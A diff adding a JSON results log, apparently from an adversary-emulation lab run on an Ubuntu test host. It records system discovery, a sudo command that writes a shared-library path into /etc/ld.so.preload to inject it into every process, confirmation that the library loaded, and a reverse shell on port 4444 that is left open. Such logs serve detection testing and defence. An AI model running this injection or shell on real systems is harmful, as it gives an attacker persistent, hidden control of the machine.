@@ -1,0 +1,49 @@
+{
+  "scenario_id": "scenario_01_ldpreload",
+  "steps": [
+    {
+      "step": "discovery",
+      "guid": "cccb070c-df86-4216-a5bc-9fb60c74e27c",
+      "name": "List OS Information",
+      "exit_code": 0,
+      "stdout": "uname -a >> /tmp/T1082.txt\n\nlabuser@lab-ubuntu-22:~$ if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi\n\nlabuser@lab-ubuntu-22:~$ if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   \n\nlabuser@lab-ubuntu-22:~$ if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi\n\nlabuser@lab-ubuntu-22:~$ if [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi\n\nlabuser@lab-ubuntu-22:~$ uptime >> /tmp/T1082.txt\n\nlabuser@lab-ubuntu-22:~$ cat /tmp/T1082.txt 2>/dev/null\n\nLinux lab-ubuntu-22 5.15.0-1095-kvm #100-Ubuntu SMP Mon Mar 9 14:33:42 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=22.04\nDISTRIB_CODENAME=jammy\nDISTRIB_DESCRIPTION=\"Ubuntu 22.04.5 LTS\"\nUbuntu 22.04.5 LTS \\n \\l\n\nPRETTY_NAME=\"Ubuntu 22.04.5 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.5 LTS (Jammy Jellyfish)\"\nVERSION_CODENAME=jammy\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=jammy\n 09:58:09 up 0 min,  1 user,  load average: 0.08, 0.02, 0.01",
+      "stderr": "",
+      "locators": {
+        "output_path": "/tmp/T1082.txt"
+      }
+    },
+    {
+      "step": "ldpreload",
+      "guid": "39cb0e67-dd0d-4b74-a74b-c072db7ae991",
+      "name": "Shared Library Injection via /etc/ld.so.preload",
+      "exit_code": 0,
+      "stdout": "sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'",
+      "stderr": "",
+      "locators": {
+        "so_path": "/tmp/T1574006.so",
+        "preload_path": "/etc/ld.so.preload"
+      }
+    },
+    {
+      "step": "ldpreload_trigger",
+      "technique": "T1574.006",
+      "exit_code": 0,
+      "trigger_pid": "761",
+      "so_loaded": true,
+      "maps_excerpt": "7f53b3e3d000-7f53b3e3e000 r--p 00000000 fe:01 1487                       /tmp/T1574006.so\n7f53b3e3e000-7f53b3e3f000 r-xp 00001000 fe:01 1487                       /tmp/T1574006.so\n7f53b3e3f000-7f53b3e40000 r--p 00002000 fe:01 1487                       /tmp/T1574006.so\n7f53b3e40000-7f53b3e41000 r--p 00002000 fe:01 1487                       /tmp/T1574006.so\n7f53b3e41000-7f53b3e42000 rw-p 00003000 fe:01 1487                       /tmp/T1574006.so"
+    },
+    {
+      "step": "reverse_shell",
+      "technique": "T1059.004",
+      "exit_code": 0,
+      "connected": true,
+      "id_output": "uid=1000(labuser) gid=1000(labuser) groups=1000(labuser),27(sudo)",
+      "error": "",
+      "kept_open": true,
+      "locators": {
+        "fifo": "/tmp/.rs_fifo",
+        "port": 4444
+      }
+    }
+  ]
+}
